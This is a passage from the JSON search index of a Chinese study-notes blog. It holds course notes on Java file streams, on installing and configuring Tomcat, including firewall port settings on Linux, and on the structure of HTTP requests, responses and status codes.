一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.7字节流复制文件【应用】 案例需求 ​ 把“E:\\itcast\\窗里窗外.txt”复制到模块目录下的“窗里窗外.txt” (文件可以是任意文件) 实现步骤 复制文本文件，其实就把文本文件的内容从一个文件中读取出来(数据源)，然后写入到另一个文件中(目的地) 数据源： ​ E:\\itcast\\窗里窗外.txt — 读数据 — InputStream — FileInputStream 目的地： ​ myByteStream\\窗里窗外.txt — 写数据 — OutputStream — FileOutputStream 代码实现 public class CopyTxtDemo { public static void main(String[] args) throws IOException { //根据数据源创建字节输入流对象 FileInputStream fis = new FileInputStream(\"E:\\\\itcast\\\\窗里窗外.txt\"); //根据目的地创建字节输出流对象 FileOutputStream fos = new FileOutputStream(\"myByteStream\\\\窗里窗外.txt\"); //读写数据，复制文本文件(一次读取一个字节，一次写入一个字节) int by; while ((by=fis.read())!=-1) { fos.write(by); } //释放资源 fos.close(); fis.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:7","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.8字节流读数据(一次读一个字节数组数据)【应用】 一次读一个字节数组的方法 public int read(byte[] b)：从输入流读取最多b.length个字节的数据 返回的是读入缓冲区的总字节数,也就是实际的读取字节个数 示例代码 public class FileInputStreamDemo02 { public static void main(String[] args) throws IOException { //创建字节输入流对象 FileInputStream fis = new FileInputStream(\"myByteStream\\\\fos.txt\"); byte[] bys = new byte[1024]; //1024及其整数倍 int len; //循环读取 while ((len=fis.read(bys))!=-1) { System.out.print(new String(bys,0,len)); } //释放资源 fis.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:8","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.9字节流复制文件【应用】 案例需求 ​ 把“E:\\itcast\\mn.jpg”复制到模块目录下的“mn.jpg” (文件可以是任意文件去) 实现步骤 根据数据源创建字节输入流对象 根据目的地创建字节输出流对象 读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组) 释放资源 代码实现 public class CopyJpgDemo { public static void main(String[] args) throws IOException { //根据数据源创建字节输入流对象 FileInputStream fis = new FileInputStream(\"E:\\\\itcast\\\\mn.jpg\"); //根据目的地创建字节输出流对象 FileOutputStream fos = new FileOutputStream(\"myByteStream\\\\mn.jpg\"); //读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组) byte[] bys = new byte[1024]; int len; while ((len=fis.read(bys))!=-1) { fos.write(bys,0,len); } //释放资源 fos.close(); fis.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:9","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"3.字节缓冲流 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:3:0","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"3.1字节缓冲流构造方法【应用】 字节缓冲流介绍 lBufferOutputStream：该类实现缓冲输出流.通过设置这样的输出流,应用程序可以向底层输出流写入字节,而不必为写入的每个字节导致底层系统的调用 lBufferedInputStream：创建BufferedInputStream将创建一个内部缓冲区数组.当从流中读取或跳过字节时,内部缓冲区将根据需要从所包含的输入流中重新填充,一次很多字节 构造方法： 方法名 说明 BufferedOutputStream(OutputStream out) 创建字节缓冲输出流对象 BufferedInputStream(InputStream in) 创建字节缓冲输入流对象 示例代码 public class BufferStreamDemo { public static void main(String[] args) throws IOException { //字节缓冲输出流：BufferedOutputStream(OutputStream out) BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"myByteStream\\\\bos.txt\")); //写数据 bos.write(\"hello\\r\\n\".getBytes()); bos.write(\"world\\r\\n\".getBytes()); //释放资源 bos.close(); //字节缓冲输入流：BufferedInputStream(InputStream in) BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"myByteStream\\\\bos.txt\")); //一次读取一个字节数据 // int by; // while ((by=bis.read())!=-1) { // System.out.print((char)by); // } //一次读取一个字节数组数据 byte[] bys = new byte[1024]; int len; while ((len=bis.read(bys))!=-1) { System.out.print(new String(bys,0,len)); } //释放资源 bis.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:3:1","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"3.2字节缓冲流复制视频【应用】 案例需求 把“E:\\itcast\\字节流复制图片.avi”复制到模块目录下的“字节流复制图片.avi” 实现步骤 根据数据源创建字节输入流对象 根据目的地创建字节输出流对象 读写数据，复制视频 释放资源 代码实现 public class CopyAviDemo { public static void main(String[] args) throws IOException { //复制视频 // method1(); method2(); } //字节缓冲流一次读写一个字节数组 public static void method2() throws IOException { BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"E:\\\\itcast\\\\字节流复制图片.avi\")); BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"myByteStream\\\\字节流复制图片.avi\")); byte[] bys = new byte[1024]; int len; while ((len=bis.read(bys))!=-1) { bos.write(bys,0,len); } bos.close(); bis.close(); } //字节缓冲流一次读写一个字节 public static void method1() throws IOException { BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"E:\\\\itcast\\\\字节流复制图片.avi\")); BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"myByteStream\\\\字节流复制图片.avi\")); int by; while ((by=bis.read())!=-1) { bos.write(by); } bos.close(); bis.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:3:2","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"Tomcat服务器使用与常用网络知识","date":"2021-07-17","objectID":"/posts/tomcathttp/","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"Tomcat\u0026Http （web服务器-重要） 0.今日学习目标： 能够理解cs架构和bs架构的区别 能够安装tomcat 能够启动tomcat 能够在idea中集成tomcat，并访问到web项目 能够知晓常见状态码及其含义 1 企业开发简介 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:0:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.1 JavaEE规范 JavaEE规范是J2EE规范的新名称，早期被称为J2EE规范，其全称是Java 2 Platform Enterprise Edition，它是由SUN公司领导、各厂家共同制定并得到广泛认可的工业标准（JCP组织成员）。之所以改名为JavaEE，目的还是让大家清楚J2EE只是Java企业应用。在2004年底中国软件技术大会Ioc微容器(也就是Jdon框架的实现原理)演讲中指出：我们需要一个跨J2SE/WEB/EJB的微容器，保护我们的业务核心组件，以延续它的生命力，而不是依赖J2SE/J2EE版本.此次J2EE改名为Java EE，实际也反映出业界这种共同心声。 JavaEE规范是很多Java开发技术的总称。这些技术规范都是沿用自J2EE的。一共包括了13个技术规范。例如：jsp/servlet，jndi，jaxp，jdbc，jni，jaxb，jmf，jta，jpa，EJB等。 其中，JCP组织的全称是Java Community Process。它是一个开放的国际组织，主要由Java开发者以及被授权者组成，职能是发展和更新。成立于1998年。官网是：JCP JavaEE的版本是延续了J2EE的版本，但是没有继续采用其命名规则。J2EE的版本从1.0开始到1.4结束，而JavaEE版本是从JavaEE 5版本开始，目前最主流的版本是JavaEE 8。 详情请参考：JavaEE8规范概览 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:1:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.2 Web概述 Web在英文中的含义是网状物，网络。在计算机领域，它通常指的是后者，即网络。像我们前面接触的WWW，它是由3个单词组成的，即：World Wide Web ，中文含义是万维网。而我们前面学的HTML，CSS和JS的参考文档《W3School全套教程》中的W3C就是万维网联盟。他们的出现都是为了让我们在网络的世界中获取资源，这些资源的存放之处，我们称之为网站。我们通过输入网站的地址（即：网址），就可以访问网站中提供的资源。在网上我们能访问到的内容全是资源（不区分局域网还是广域网）。只不过，不同类型的资源展示的效果不一样。 首先，我们先来介绍资源的分类，它分为静态资源和动态资源。其中： 静态资源指的是，网站中提供给人们展示的资源是一成不变的，也就是说不同人或者在不同时间，看到的内容都是一样的。例如：我们看到的新闻，网站的使用手册，网站功能说明文档等等。而作为开发者，我们编写的html,css,js,图片，多媒体等等都可以称为静态资源。 动态资源它指的是，网站中提供给人们展示的资源是由程序产生的，在不同的时间或者用不同的人员由于身份的不同，所看到的内容是不一样的。例如：我们在12306上购买火车票，火车票的余票数由于时间的变化，会逐渐的减少，直到最后没有余票。还有，我们在CSDN上下载资料，只有登录成功后，且积分足够时才能下载。否则就不能下载，这就是访客身份和会员身份的区别。作为开发人员，我们编写的JSP，servlet，php，ASP等都是动态资源。 关于广域网和局域网的划分，广域网指的就是万维网，也就是我们说的互联网。局域网是指的是在一定范围之内可以访问的网络，出了这个范围，就不能再使用的网络。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:2:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"小结： web资源： 静态资源： html / css /js / img图片.... 动态资源： jsp 、 servlet （每次请求都会经过服务器，不同的用户查看到的数据可能是不一样的） 端游 ： 客户端 页游： 不用下载（浏览器） ","date":"2021-07-17","objectID":"/posts/tomcathttp/:2:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.3 系统结构 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:3:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.3.1 系统结构简介 在我们前面课程的学习中，开发的都是Java工程。这些工程在企业中称之为项目或者产品。项目也好，产品也罢，它是有系统架构的，系统架构的划分有很多种方式。我们今天讨论的是基础结构上的划分。除此之外，还有技术选型划分，部署方式划分等等。 ==基础结构划分：C/S架构，B/S架构两类。== 技术选型划分：Model1模型，Model2模型，MVC模型和三层架构+MVC模型。 部署方式划分：一体化架构，垂直拆分架构，分布式架构，流动计算架构，微服务架构。 一体化架构是将应用各层（表示层、业务逻辑层、数据访问、应用集成逻辑）打成一个包来部署。 垂直拆分是将同样的系统按照**应用场景(调用方)**进行拆分 。比如支付模块分为商家支付和用户支付 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:3:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.3.2 C/S结构 它指的是客户端——服务器的方式。其中C代表着Client，S代表着服务器。C/S结构的系统设计图如下： ","date":"2021-07-17","objectID":"/posts/tomcathttp/:3:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.3.3 B/S结构 它指的是浏览器——服务器的方式。其中B代表着Browser，S代表着服务器。B/S结构的系统设计图如下： ","date":"2021-07-17","objectID":"/posts/tomcathttp/:3:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"1.3.4 两种结构的区别及优略 两种结构的区别 第一：硬件环境不同，C/S通常是建立在专用的网络或小范围的网络环境上（即局域网），且必须要安装客户端。而B/S是建立在广域网上的，适应范围强，通常有操作系统和浏览器就行。 第二：C/S结构比B/S结构更安全，因为用户群相对固定，对信息的保护更强。 第三：B/S结构维护升级比较简单，而C/S结构维护升级相对困难。 优略 1 C/S：是能充分发挥客户端PC的处理能力，很多工作可以在客户端处理后再提交给服务器。对应的优点就是客户端响应速度快。 2 B/S：总体拥有成本低、维护方便、 分布性强、开发简单，可以不用安装任何专门的软件就能 实现在任何地方进行操作，客户端零维护，系统的扩展非常容易，只要有一台能上网的电脑就能使用。 关于课程中结构的选择 我们的课程中涉及的系统结构都是是基于B/S结构。 2 Tomcat ","date":"2021-07-17","objectID":"/posts/tomcathttp/:3:4","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.1 Tomcat介绍 tomcat是一个免费的开源的 web应用服务器 的 软件！ IOE： ​ ibm – 服务器硬件 ​ oracle – 数据库 ​ emc — 存储 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:4:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.1.1 关于服务器 服务器的概念非常的广泛，它可以指代一台特殊的计算机（相比普通计算机运行更快、负载更高、价格更贵），也可以指代用于部署网站的应用。我们这里说的服务器，其实是web服务器，或者应用服务器。它本质就是一个软件，一个应用。作用就是发布我们的应用（工程），让用户可以通过浏览器访问我们的应用。 常见的应用服务器，请看下表： 服务器名称 说明 weblogic 实现了javaEE规范，重量级服务器，又称为javaEE容器（oracle） websphere 实现了javaEE规范，重量级服务器。（ibm） JBOSS 实现了JavaEE规范，重量级服务器。免费的。 ==Tomcat== 实现了jsp/servlet规范，是一个==轻量级服务器，开源免费。== ","date":"2021-07-17","objectID":"/posts/tomcathttp/:4:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.1.2 Tomcat下载与安装 Tomcat官网下载地址 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:4:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.1.3 Tomcat各版本所需支持 JDK8 + tomcat9 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:4:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.1.4 Tomcat目录结构详解 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:4:4","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"小结：（记住） ","date":"2021-07-17","objectID":"/posts/tomcathttp/:4:5","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.2 Tomcat基本使用 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:5:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.2.1 Tomcat启动和停止及问题分析解决（理解） 1）启动和停止 Tomcat服务器的启动文件在二进制文件目录中：，这两个文件就是Tomcat的启动文件。 Tomcat服务器的停止文件也在二进制文件目录中：，这两个文件就是Tomcat的停止文件。 其中.bat文件是针对windows系统的运行程序，.sh文件是针对linux系统的运行程序。 2）启动问题 第一个问题：启动一闪而过 原因：没有配置JDK环境变量。 解决办法：配置上JAVA_HOME环境变量 第二个：Address already in use : JVM_Bind 原因：端口被占用 解决办法：找到占用该端口的应用 ​ 进程不重要：使用cmd命令：netstat -a -o 查看pid 在任务管理器中结束占用端口的进程。 ​ 进程很重要：修改自己的端口号。修改的是Tomcat目录下\\conf\\server.xml中的配置。 ​ 第三个：启动产生很多异常，但能正常启动 原因：Tomcat中部署着很多项目，每次启动这些项目都会启动。而这些项目中有启动报异常的。 解决办法： ​ 能找到报异常的项目，就把它从发布目录中移除。 ​ 不能确定报异常的项目，就重新解压一个新的Tomcat。 第四个：其它问题 例如：启动产生异常，但是不能正常启动。此时就需要解压一个新的Tomcat启动，来确定是系统问题，还是Tomcat的问题。 所以，此时就需要具体问题，具体分析，然后再对症解决。 如果是中文乱码： 可以改配置文件中的字符集：gbk (可以不配置) ","date":"2021-07-17","objectID":"/posts/tomcathttp/:5:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.2.2 IDEA集成Tomcat服务器（重要） 第一步 第二步 第三步 第四步 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:5:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.2.3 Linux系统安装Tomcat（课下了解） 第一步：下载tomcat 参考**2.1.2小节的《Tomcat下载与安装》**进入Tomcat官网，找到对应版本点击download进入下载页面，如下图： 第二步：上传到linux 在crt上 使用 alt+p 将windows上的软件拖进去即可(root目录) 第三步：在 /usr/local 新建一个文件夹tomcat mkdir /usr/local/tomcat 第四步：移动 tomcat…tar.gz 到 /usr/local/tomcat mv apache-tomcat-8.5.32.tar.gz /usr/local/tomcat/ 第五步：进入/usr/local/tomcat目录,解压Tomcat cd /usr/local/tomcat tar -xvf apache-tomcat-8.5.32.tar.gz 第六步：进入 /usr/local/tomcat/apache-tomcat-8.5.32/bin cd /usr/local/tomcat/apache-tomcat-8.5.32/bin 第七步：启动tomcat 方式1: sh startup.sh 方式2: ./startup.sh **第八步：修改防火墙的规则 ** 方式1:service iptables stop 关闭防火墙(不建议); 用到哪一个端口号就放行哪一个(80,8080,3306...) 方式2:放行8080 端口 修改配置文件 cd /etc/sysconfig vi iptables 复制(yy , p) -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT 改成 -A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT 重启加载防火墙或者重启防火墙 service iptables reload 或者 service iptables restart ","date":"2021-07-17","objectID":"/posts/tomcathttp/:5:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.3 Tomcat发布应用-JavaWeb应用 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:6:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.3.1 JavaWeb工程概述 JavaWeb应用是一个全新的应用种类。这类应用程序指供浏览器访问的程序，通常也简称为web应用。 一个web应用由多个静态web资源和动态web资源组成，例如：html、css、js文件，jsp文件、java程序、支持jar包、工程配置文件、图片、音视频等等。 Web应用开发好后，若想供外界访问，需要把web应用所在目录交给Web服务器管理（Tomcat就是Web服务器之一），这个过程称之为虚似目录的映射。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:6:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.3.2 JavaWeb应用目录结构详解 myapp--------------应用名称 1.html css/css.css js/demo.js WEB-INF--------如果有web.xml或者.class文件时，该目录必须存在，且严格区分大小写。 --------该目录下的资源，客户端是无法直接访问的。 --------目录中内容如下： classes目录----------------web应用的class文件（加载顺序：我们的class，lib目录中的jar包，tomcat的lib目录中的jar包。优先级依次降低） lib目录--------------------web应用所需的jar包（tomcat的lib目录下jar为所有应用共享） web.xml-------------------web应用的主配置文件 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:6:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.3.3 JavaWeb应用的创建 第一步 第二步 第三步 第四步 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:6:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.3.4 JavaWeb应用的部署 1）IDEA部署 第一步 第二步 第三步 2）war包发布(暂时不用，以后使用maven) 第一步：使用jar -cvf war 包的名称 当前目录中哪些资源要打入war 第二步：把打好的war拷贝到tomcat的webapps目录中 第三步：启动服务时，tomcat会自动解压。 tomcat的webapps目录的作用： ","date":"2021-07-17","objectID":"/posts/tomcathttp/:6:4","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.4 tomcat配置： ","date":"2021-07-17","objectID":"/posts/tomcathttp/:7:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.4.1 Tomcat配置虚拟目录 (目前了解) 虚拟目录的配置，支持两种方式。第一种是通过在主配置文件中添加标签实现。第二种是通过写一个独立配置文件实现。 第一种方式：在server.xml的\u003cHost\u003e元素中加一个\u003cContext path=\"\" docBase=\"\"/\u003e元素。 ​ path：访问资源URI。URI名称可以随便起，但是必须在前面加上一个/ ​ docBase：资源所在的磁盘物理地址。 第二种方式：是写一个独立的xml文件，该文件名可以随便起。在文件内写一个\u003cContext/\u003e元素。 ​ 该文件要放在Tomcat目录中的conf\\Catalina\\localhost\\目录下。 需要注意的是，在使用了独立的配置文件之后，访问资源URI就变成了/+文件的名称。而Context的path属性就失效了。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:7:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"2.4.2 Tomcat默认项配置 配置默认端口 Tomcat的默认端口是8080。 http：的默认端口 80 ， 80是可以省略！ 配置方式如下： \u003cConnector port=\"80\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" /\u003e 配置默认应用 有两种方式配置默认应用。 第一种：把要作为默认应用的应用，名称改为ROOT。放到webapps目录中。 第二种：写一个独立的配置文件，文件名称为ROOT.xml。 ​ 注意：ROOT必须大写。当使用了独立的ROOT.xml文件时，webapps下ROOT应用就不是默认应用了。 3 HTTP协议 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:7:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.1 HTTP协议概述 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:8:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.1.1 HTTP协议概念 HTTP的全称是：Hyper Text Transfer Protocol，意为 超文本传输协议。它指的是服务器和客户端之间交互必须遵循的一问一答的规则。形容这个规则：问答机制、握手机制。 ==HTTP==规范了==请求==和==响应==内容的类型和格式。 HTTP协议是由W3C组织管理和维护的。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:8:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.1.2 HTTP协议版本 目前HTTP协议主要是1.0版本和1.1版本。这两个版本的区别主要是两个方面。 第一：HTTP1.1版本比1.0版本多了一些消息头。 第二：HTTP1.1版本和1.0版本的执行过程不一样。执行过程如下： 创建连接（TCP/IP） 创建连接（TCP/IP） HTTP1.0 HTTP1.1 发送请求 发送请求1 得到响应 得到响应1 关闭连接 发送请求2 创建连接（TCP/IP） 得到响应2 发送请求 ……. 得到响应 ……. 关闭连接 连接超时或手动关闭连接 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:8:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.1.3 HTTP协议相关说明 HTTP协议概念是客户浏览器和服务器一种一问一答的规则，那么必须要有问有答，而且要先问后答。 但是我们使用\u003cscript\u003e,\u003clink\u003e和\u003cimg\u003e标签，没有手动发起请求，但是仍然能从服务器端拿到数据，原因就是：在浏览器遇到\u003cscript\u003e,\u003clink\u003e,\u003cimg\u003e标签时会自动发出请求。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:8:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.2 HTTP协议组成 由HTTP协议的概念可知，它分为问和答两部分。其中问指的就是请求部分，而答指的就是响应部分。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:9:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.2.1请求部分 请求行： 永远位于请求的第一行 请求消息头： 从第二行开始，到第一个空行结束 请求的正文： 从第一个空行后开始，到正文的结束 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:9:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.2.2 响应部分 响应行： 永远位于响应的第一行 响应消息头： 从第二行开始，到第一个空行结束 响应的正文： 从第一个空行后开始，到正文的结束 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:9:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.3.3 消息头的共性分析 消息头名称首字母大写，多个单词每个单词的首字母都大写。 多个单词用-分隔 名称和值之间用冒号加空格分隔 多个值之间用逗号加空格分隔 两个头之间用回车分隔 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:9:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.3 请求部分详解 （后面花一天讲解） ","date":"2021-07-17","objectID":"/posts/tomcathttp/:10:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.3.1 请求行详解 请求行：GET /myapp/2.html HTTP/1.1 内容 说明 GET 请求的方式。（还有POST） /myapp/2.html 请求的资源。 HTTP/1.1 使用的协议，及协议的版本。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:10:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.3.2 请求消息头详解 内容 说明 Accept 告知服务器，客户浏览器所支持的MIME类型。 Accept-Encoding 告知服务器，客户浏览器所支持的压缩编码格式。最常用的就是gzip压缩。 Accept-Language 告知服务器，客户浏览器所支持的语言。一般都是zh_CN或en_US等。 Referer 告知服务器，当前请求的来源。只有当前请求有来源的时候，才有这个消息头。从地址栏输入的没有来源。作用：1 投放广告 2 防盗链 Content-Type 告知服务器，请求正文的MIME类型。 Content-Length 告知服务器，请求正文的长度。 User-Agent 浏览器相关信息 Connection: Keep-Alive 连接的状态：保持连接 If-Modified-Since 告知服务器，客户浏览器缓存文件的最后修改时间。 Cookie（********） 会话管理相关，非常的重要。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:10:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.3.3 请求正文详解 第一：只有post请求方式，才有请求的正文。get方式的正文是在地址栏中的。 第二：表单的输入域有name属性的才会被提交。不分get和post的请求方式。 第三：表单的enctype属性取值决定了请求正文的体现形式。概述的含义是：请求正文的MIME编码类型。 enctype取值 请求正文体现形式 示例 application/x-www-form-urlencoded key=value\u0026key=value username=test\u0026password=1234 multipart/form-data 此时变成了多部分表单数据。多部分是靠分隔符分隔的。 —————————–7df23a16c0210Content-Disposition: form-data; name=“username”test—————————–7df23a16c0210Content-Disposition: form-data; name=“password”1234—————————–7df23a16c0210Content-Disposition: form-data; name=“headfile”; filename=“C:\\Users\\zhy\\Desktop\\请求部分.jpg”Content-Type: image/pjpeg—————————–7df23a16c0210 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:10:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.4 响应部分详解 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:11:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.4.1 响应行详解 响应行：HTTP/1.1 200 OK 内容 说明 HTTP/1.1 使用协议的版本。 200 响应状态码 OK 状态码描述 常用状态码介绍： 状态码 说明 200 一切都OK 302/307 请求重定向(客户端行为，两次请求，地址栏发生改变) 304 请求资源未发生变化，使用缓存 404 请求资源未找到 500 服务器错误 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:11:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.4.2 响应消息头详解 Location 请求重定向的地址，常与302,307配合使用。 消息头 说明 Server 服务器相关信息。 Content-Type 告知客户浏览器，响应正文的MIME类型。application/json text/html Content-Length 告知客户浏览器，响应正文的长度。 Content-Encoding 告知客户浏览器，响应正文使用的压缩编码格式。常用的gzip压缩。 Content-Language 告知客户浏览器，响应正文的语言。zh_CN或en_US等等。 Content-Disposition 告知客户浏览器，以下载的方式打开响应正文。 Refresh 定时刷新 Last-Modified 服务器资源的最后修改时间。 Set-Cookie（*******） 会话管理相关，非常的重要 Expires:-1 服务器资源到客户浏览器后的缓存时间 Catch-Control: no-catch 不要缓存，//针对http协议1.1版本 Pragma:no-catch 不要缓存，//针对http协议1.0版本 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:11:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"3.4.3 响应正文详解 就和我们在浏览器上右键查看源文件看到的内容是一样的。 \u003chtml\u003e \u003chead\u003e \u003clink rel=\"stylesheet\" href=\"css.css\" type=\"text/css\"\u003e \u003cscript type=\"text/javascript\" src=\"demo.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cimg src=\"1.jpg\" /\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2021-07-17","objectID":"/posts/tomcathttp/:11:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"小结：（记忆） 1. 请求分成几部分： 1. 请求行 ---- get www.baidu.com http/1.1 2. 请求头 ---- 很多信息（后面具体使用，展开讲解） 3. 请求空行 ----- 什么都没有（空白） 4. 请求体 ----- （get没有请求体， post有请求体） 响应分成几部分： ​ 同上，4部分 2. get和post的区别： a. 请求的参数位置： b. 请求的参数的容量是否有限制： c. 是否有请求体： 